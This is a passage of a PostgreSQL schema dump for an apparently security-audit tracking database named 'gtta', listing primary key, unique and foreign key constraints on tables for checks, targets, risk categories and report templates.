-- Name: check_inputs_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_inputs_l10n
    ADD CONSTRAINT check_inputs_l10n_pkey PRIMARY KEY (check_input_id, language_id);


--
-- TOC entry 2070 (class 2606 OID 21826)
-- Dependencies: 146 146
-- Name: check_inputs_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_inputs
    ADD CONSTRAINT check_inputs_pkey PRIMARY KEY (id);


--
-- TOC entry 2076 (class 2606 OID 21828)
-- Dependencies: 151 151 151
-- Name: check_results_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_results_l10n
    ADD CONSTRAINT check_results_l10n_pkey PRIMARY KEY (check_result_id, language_id);


--
-- TOC entry 2074 (class 2606 OID 21830)
-- Dependencies: 149 149
-- Name: check_results_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_results
    ADD CONSTRAINT check_results_pkey PRIMARY KEY (id);


--
-- TOC entry 2080 (class 2606 OID 21832)
-- Dependencies: 154 154 154
-- Name: check_solutions_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_solutions_l10n
    ADD CONSTRAINT check_solutions_l10n_pkey PRIMARY KEY (check_solution_id, language_id);


--
-- TOC entry 2078 (class 2606 OID 21834)
-- Dependencies: 152 152
-- Name: check_solutions_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_solutions
    ADD CONSTRAINT check_solutions_pkey PRIMARY KEY (id);


--
-- TOC entry 2084 (class 2606 OID 21836)
-- Dependencies: 157 157 157
-- Name: checks_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY checks_l10n
    ADD CONSTRAINT checks_l10n_pkey PRIMARY KEY (check_id, language_id);


--
-- TOC entry 2082 (class 2606 OID 21838)
-- Dependencies: 155 155
-- Name: checks_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY checks
    ADD CONSTRAINT checks_pkey PRIMARY KEY (id);


--
-- TOC entry 2086 (class 2606 OID 21840)
-- Dependencies: 158 158
-- Name: clients_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY clients
    ADD CONSTRAINT clients_pkey PRIMARY KEY (id);


--
-- TOC entry 2088 (class 2606 OID 21842)
-- Dependencies: 160 160
-- Name: emails_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY emails
    ADD CONSTRAINT emails_pkey PRIMARY KEY (id);


--
-- TOC entry 2090 (class 2606 OID 21844)
-- Dependencies: 162 162
-- Name: languages_code_key; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY languages
    ADD CONSTRAINT languages_code_key UNIQUE (code);


--
-- TOC entry 2092 (class 2606 OID 21846)
-- Dependencies: 162 162
-- Name: languages_name_key; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY languages
    ADD CONSTRAINT languages_name_key UNIQUE (name);


--
-- TOC entry 2094 (class 2606 OID 21848)
-- Dependencies: 162 162
-- Name: languages_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY languages
    ADD CONSTRAINT languages_pkey PRIMARY KEY (id);


--
-- TOC entry 2096 (class 2606 OID 21850)
-- Dependencies: 164 164
-- Name: project_details_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY project_details
    ADD CONSTRAINT project_details_pkey PRIMARY KEY (id);


--
-- TOC entry 2130 (class 2606 OID 26348)
-- Dependencies: 187 187 187
-- Name: project_users_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY project_users
    ADD CONSTRAINT project_users_pkey PRIMARY KEY (project_id, user_id);


--
-- TOC entry 2098 (class 2606 OID 21852)
-- Dependencies: 166 166
-- Name: projects_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY projects
    ADD CONSTRAINT projects_pkey PRIMARY KEY (id);


--
-- TOC entry 2100 (class 2606 OID 21854)
-- Dependencies: 168 168
-- Name: references_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY "references"
    ADD CONSTRAINT references_pkey PRIMARY KEY (id);


--
-- TOC entry 2150 (class 2606 OID 28082)
-- Dependencies: 200 200 200
-- Name: report_template_sections_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY report_template_sections_l10n
    ADD CONSTRAINT report_template_sections_l10n_pkey PRIMARY KEY (report_template_section_id, language_id);


--
-- TOC entry 2146 (class 2606 OID 28064)
-- Dependencies: 199 199
-- Name: report_template_sections_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY report_template_sections
    ADD CONSTRAINT report_template_sections_pkey PRIMARY KEY (id);


--
-- TOC entry 2148 (class 2606 OID 28164)
-- Dependencies: 199 199 199
-- Name: report_template_sections_report_template_id_key; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY report_template_sections
    ADD CONSTRAINT report_template_sections_report_template_id_key UNIQUE (report_template_id, check_category_id);


--
-- TOC entry 2144 (class 2606 OID 27354)
-- Dependencies: 197 197 197
-- Name: report_template_summary_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY report_template_summary_l10n
    ADD CONSTRAINT report_template_summary_l10n_pkey PRIMARY KEY (report_template_summary_id, language_id);


--
-- TOC entry 2142 (class 2606 OID 27346)
-- Dependencies: 196 196
-- Name: report_template_summary_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY report_template_summary
    ADD CONSTRAINT report_template_summary_pkey PRIMARY KEY (id);


--
-- TOC entry 2140 (class 2606 OID 27322)
-- Dependencies: 194 194 194
-- Name: report_templates_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY report_templates_l10n
    ADD CONSTRAINT report_templates_l10n_pkey PRIMARY KEY (report_template_id, language_id);


--
-- TOC entry 2138 (class 2606 OID 27314)
-- Dependencies: 193 193
-- Name: report_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY report_templates
    ADD CONSTRAINT report_templates_pkey PRIMARY KEY (id);


--
-- TOC entry 2124 (class 2606 OID 22089)
-- Dependencies: 184 184 184
-- Name: risk_categories_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY risk_categories_l10n
    ADD CONSTRAINT risk_categories_l10n_pkey PRIMARY KEY (risk_category_id, language_id);


--
-- TOC entry 2122 (class 2606 OID 22081)
-- Dependencies: 183 183
-- Name: risk_categories_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY risk_categories
    ADD CONSTRAINT risk_categories_pkey PRIMARY KEY (id);


--
-- TOC entry 2126 (class 2606 OID 24903)
-- Dependencies: 185 185 185
-- Name: risk_category_checks_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY risk_category_checks
    ADD CONSTRAINT risk_category_checks_pkey PRIMARY KEY (risk_category_id, check_id);


--
-- TOC entry 2134 (class 2606 OID 26377)
-- Dependencies: 190 190 190
-- Name: risk_templates_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY risk_templates_l10n
    ADD CONSTRAINT risk_templates_l10n_pkey PRIMARY KEY (risk_template_id, language_id);


--
-- TOC entry 2132 (class 2606 OID 26369)
-- Dependencies: 189 189
-- Name: risk_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY risk_templates
    ADD CONSTRAINT risk_templates_pkey PRIMARY KEY (id);


--
-- TOC entry 2128 (class 2606 OID 26343)
-- Dependencies: 186 186
-- Name: sessions_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY sessions
    ADD CONSTRAINT sessions_pkey PRIMARY KEY (id);


--
-- TOC entry 2102 (class 2606 OID 21856)
-- Dependencies: 170 170
-- Name: system_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY system
    ADD CONSTRAINT system_pkey PRIMARY KEY (id);


--
-- TOC entry 2104 (class 2606 OID 21858)
-- Dependencies: 172 172
-- Name: target_check_attachments_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY target_check_attachments
    ADD CONSTRAINT target_check_attachments_pkey PRIMARY KEY (path);


--
-- TOC entry 2106 (class 2606 OID 21860)
-- Dependencies: 173 173 173
-- Name: target_check_categories_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY target_check_categories
    ADD CONSTRAINT target_check_categories_pkey PRIMARY KEY (target_id, check_category_id);


--
-- TOC entry 2108 (class 2606 OID 21862)
-- Dependencies: 174 174 174
-- Name: target_check_inputs_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY target_check_inputs
    ADD CONSTRAINT target_check_inputs_pkey PRIMARY KEY (target_id, check_input_id);


--
-- TOC entry 2110 (class 2606 OID 21864)
-- Dependencies: 175 175 175
-- Name: target_check_solutions_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY target_check_solutions
    ADD CONSTRAINT target_check_solutions_pkey PRIMARY KEY (target_id, check_solution_id);


--
-- TOC entry 2136 (class 2606 OID 26910)
-- Dependencies: 191 191 191
-- Name: target_check_vulns_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY target_check_vulns
    ADD CONSTRAINT target_check_vulns_pkey PRIMARY KEY (target_id, check_id);


--
-- TOC entry 2112 (class 2606 OID 21866)
-- Dependencies: 176 176 176
-- Name: target_checks_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY target_checks
    ADD CONSTRAINT target_checks_pkey PRIMARY KEY (target_id, check_id);


--
-- TOC entry 2114 (class 2606 OID 21868)
-- Dependencies: 177 177 177
-- Name: target_references_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY target_references
    ADD CONSTRAINT target_references_pkey PRIMARY KEY (target_id, reference_id);


--
-- TOC entry 2116 (class 2606 OID 21870)
-- Dependencies: 178 178
-- Name: targets_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY targets
    ADD CONSTRAINT targets_pkey PRIMARY KEY (id);


--
-- TOC entry 2118 (class 2606 OID 21872)
-- Dependencies: 180 180
-- Name: users_email_key; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY users
    ADD CONSTRAINT users_email_key UNIQUE (email);


--
-- TOC entry 2120 (class 2606 OID 21874)
-- Dependencies: 180 180
-- Name: users_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY users
    ADD CONSTRAINT users_pkey PRIMARY KEY (id);


--
-- TOC entry 2151 (class 2606 OID 21875)
-- Dependencies: 2061 142 140
-- Name: check_categories_l10n_check_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_categories_l10n
    ADD CONSTRAINT check_categories_l10n_check_category_id_fkey FOREIGN KEY (check_category_id) REFERENCES check_categories(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2152 (class 2606 OID 21880)
-- Dependencies: 162 2093 142
-- Name: check_categories_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_categories_l10n
    ADD CONSTRAINT check_categories_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2153 (class 2606 OID 21885)
-- Dependencies: 2061 143 140
-- Name: check_controls_check_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_controls
    ADD CONSTRAINT check_controls_check_category_id_fkey FOREIGN KEY (check_category_id) REFERENCES check_categories(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2154 (class 2606 OID 21890)
-- Dependencies: 145 143 2065
-- Name: check_controls_l10n_check_control_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_controls_l10n
    ADD CONSTRAINT check_controls_l10n_check_control_id_fkey FOREIGN KEY (check_control_id) REFERENCES check_controls(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2155 (class 2606 OID 21895)
-- Dependencies: 2093 162 145
-- Name: check_controls_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_controls_l10n
    ADD CONSTRAINT check_controls_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2156 (class 2606 OID 21900)
-- Dependencies: 2081 155 146
-- Name: check_inputs_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_inputs
    ADD CONSTRAINT check_inputs_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2157 (class 2606 OID 21905)
-- Dependencies: 2069 146 148
-- Name: check_inputs_l10n_check_input_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_inputs_l10n
    ADD CONSTRAINT check_inputs_l10n_check_input_id_fkey FOREIGN KEY (check_input_id) REFERENCES check_inputs(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2158 (class 2606 OID 21910)
-- Dependencies: 148 162 2093
-- Name: check_inputs_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_inputs_l10n
    ADD CONSTRAINT check_inputs_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2159 (class 2606 OID 22135)
-- Dependencies: 2081 149 155
-- Name: check_results_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_results
    ADD CONSTRAINT check_results_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2160 (class 2606 OID 22105)
-- Dependencies: 151 149 2073
-- Name: check_results_l10n_check_result_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_results_l10n
    ADD CONSTRAINT check_results_l10n_check_result_id_fkey FOREIGN KEY (check_result_id) REFERENCES check_results(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2161 (class 2606 OID 22110)
-- Dependencies: 162 151 2093
-- Name: check_results_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_results_l10n
    ADD CONSTRAINT check_results_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2162 (class 2606 OID 22130)
-- Dependencies: 155 152 2081
-- Name: check_solutions_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_solutions
    ADD CONSTRAINT check_solutions_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2163 (class 2606 OID 22120)
-- Dependencies: 154 152 2077
-- Name: check_solutions_l10n_check_solution_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_solutions_l10n
    ADD CONSTRAINT check_solutions_l10n_check_solution_id_fkey FOREIGN KEY (check_solution_id) REFERENCES check_solutions(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2164 (class 2606 OID 22125)
-- Dependencies: 154 162 2093
-- Name: check_solutions_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_solutions_l10n
    ADD CONSTRAINT check_solutions_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2165 (class 2606 OID 22140)
-- Dependencies: 143 155 2065
-- Name: checks_check_control_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY checks
    ADD CONSTRAINT checks_check_control_id_fkey FOREIGN KEY (check_control_id) REFERENCES check_controls(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2167 (class 2606 OID 22150)
-- Dependencies: 155 157 2081
-- Name: checks_l10n_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY checks_l10n
    ADD CONSTRAINT checks_l10n_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2168 (class 2606 OID 22155)
-- Dependencies: 162 157 2093
-- Name: checks_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY checks_l10n
    ADD CONSTRAINT checks_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2166 (class 2606 OID 22145)
-- Dependencies: 168 155 2099
-- Name: checks_reference_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY checks
    ADD CONSTRAINT checks_reference_id_fkey FOREIGN KEY (reference_id) REFERENCES "references"(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2169 (class 2606 OID 21965)
-- Dependencies: 2119 160 180
-- Name: emails_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY emails
    ADD CONSTRAINT emails_user_id_fkey FOREIGN KEY (user_id) REFERENCES users(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2170 (class 2606 OID 21970)
-- Dependencies: 164 166 2097
-- Name: project_details_project_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY project_details
    ADD CONSTRAINT project_details_project_id_fkey FOREIGN KEY (project_id) REFERENCES projects(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2198 (class 2606 OID 26896)
-- Dependencies: 187 166 2097
-- Name: project_users_project_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY project_users
    ADD CONSTRAINT project_users_project_id_fkey FOREIGN KEY (project_id) REFERENCES projects(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2199 (class 2606 OID 26901)
-- Dependencies: 187 2119 180
-- Name: project_users_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY project_users
    ADD CONSTRAINT project_users_user_id_fkey FOREIGN KEY (user_id) REFERENCES users(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2171 (class 2606 OID 26965)
-- Dependencies: 2085 158 166
-- Name: projects_client_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY projects
    ADD CONSTRAINT projects_client_id_fkey FOREIGN KEY (client_id) REFERENCES clients(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2211 (class 2606 OID 28153)
-- Dependencies: 2061 199 140
-- Name: report_template_sections_check_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_sections
    ADD CONSTRAINT report_template_sections_check_category_id_fkey FOREIGN KEY (check_category_id) REFERENCES check_categories(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2213 (class 2606 OID 28143)
-- Dependencies: 2093 162 200
-- Name: report_template_sections_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_sections_l10n
    ADD CONSTRAINT report_template_sections_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2214 (class 2606 OID 28148)
-- Dependencies: 2145 199 200
-- Name: report_template_sections_l10n_report_template_section_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_sections_l10n
    ADD CONSTRAINT report_template_sections_l10n_report_template_section_id_fkey FOREIGN KEY (report_template_section_id) REFERENCES report_template_sections(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2212 (class 2606 OID 28158)
-- Dependencies: 193 199 2137
-- Name: report_template_sections_report_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_sections
    ADD CONSTRAINT report_template_sections_report_template_id_fkey FOREIGN KEY (report_template_id) REFERENCES report_templates(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2209 (class 2606 OID 27375)
-- Dependencies: 197 2093 162
-- Name: report_template_summary_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_summary_l10n
    ADD CONSTRAINT report_template_summary_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2210 (class 2606 OID 27380)
-- Dependencies: 197 196 2141
-- Name: report_template_summary_l10n_report_template_summary_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_summary_l10n
    ADD CONSTRAINT report_template_summary_l10n_report_template_summary_id_fkey FOREIGN KEY (report_template_summary_id) REFERENCES report_template_summary(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2208 (class 2606 OID 28118)
-- Dependencies: 193 2137 196
-- Name: report_template_summary_report_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_summary
    ADD CONSTRAINT report_template_summary_report_template_id_fkey FOREIGN KEY (report_template_id) REFERENCES report_templates(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2206 (class 2606 OID 28165)
-- Dependencies: 194 162 2093
-- Name: report_templates_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_templates_l10n
    ADD CONSTRAINT report_templates_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2207 (class 2606 OID 28170)
-- Dependencies: 2137 194 193
-- Name: report_templates_l10n_report_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_templates_l10n
    ADD CONSTRAINT report_templates_l10n_report_template_id_fkey FOREIGN KEY (report_template_id) REFERENCES report_templates(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2195 (class 2606 OID 22095)
-- Dependencies: 2093 162 184
-- Name: risk_categories_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_categories_l10n
    ADD CONSTRAINT risk_categories_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2194 (class 2606 OID 22090)
-- Dependencies: 183 2121 184
-- Name: risk_categories_l10n_risk_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_categories_l10n
    ADD CONSTRAINT risk_categories_l10n_risk_category_id_fkey FOREIGN KEY (risk_category_id) REFERENCES risk_categories(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2193 (class 2606 OID 26388)
-- Dependencies: 189 183 2131
-- Name: risk_categories_risk_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_categories
    ADD CONSTRAINT risk_categories_risk_template_id_fkey FOREIGN KEY (risk_template_id) REFERENCES risk_templates(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2196 (class 2606 OID 24924)
-- Dependencies: 155 185 2081
-- Name: risk_category_checks_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_category_checks
    ADD CONSTRAINT risk_category_checks_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2197 (class 2606 OID 24929)
-- Dependencies: 2121 185 183
-- Name: risk_category_checks_risk_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_category_checks
    ADD CONSTRAINT risk_category_checks_risk_category_id_fkey FOREIGN KEY (risk_category_id) REFERENCES risk_categories(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2201 (class 2606 OID 26383)
-- Dependencies: 189 190 2131
-- Name: risk_templates_l10n_risk_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_templates_l10n
    ADD CONSTRAINT risk_templates_l10n_risk_template_id_fkey FOREIGN KEY (risk_template_id) REFERENCES risk_templates(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2200 (class 2606 OID 26378)
-- Dependencies: 162 190 2093
-- Name: risk_templatess_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_templates_l10n
    ADD CONSTRAINT risk_templatess_l10n_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2172 (class 2606 OID 27274)
-- Dependencies: 155 172 2081
-- Name: target_check_attachments_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_attachments
    ADD CONSTRAINT target_check_attachments_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2173 (class 2606 OID 27279)
-- Dependencies: 178 172 2115
-- Name: target_check_attachments_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_attachments
    ADD CONSTRAINT target_check_attachments_target_id_fkey FOREIGN KEY (target_id) REFERENCES targets(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2174 (class 2606 OID 27284)
-- Dependencies: 176 172 172 176 2111
-- Name: target_check_attachments_target_id_fkey1; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_attachments
    ADD CONSTRAINT target_check_attachments_target_id_fkey1 FOREIGN KEY (target_id, check_id) REFERENCES target_checks(target_id, check_id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2175 (class 2606 OID 27294)
-- Dependencies: 140 2061 173
-- Name: target_check_categories_check_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_categories
    ADD CONSTRAINT target_check_categories_check_category_id_fkey FOREIGN KEY (check_category_id) REFERENCES check_categories(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2176 (class 2606 OID 27299)
-- Dependencies: 178 173 2115
-- Name: target_check_categories_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_categories
    ADD CONSTRAINT target_check_categories_target_id_fkey FOREIGN KEY (target_id) REFERENCES targets(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2177 (class 2606 OID 27254)
-- Dependencies: 174 155 2081
-- Name: target_check_inputs_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_inputs
    ADD CONSTRAINT target_check_inputs_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2178 (class 2606 OID 27259)
-- Dependencies: 174 146 2069
-- Name: target_check_inputs_check_input_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_inputs
    ADD CONSTRAINT target_check_inputs_check_input_id_fkey FOREIGN KEY (check_input_id) REFERENCES check_inputs(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2179 (class 2606 OID 27264)
-- Dependencies: 2115 174 178
-- Name: target_check_inputs_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_inputs
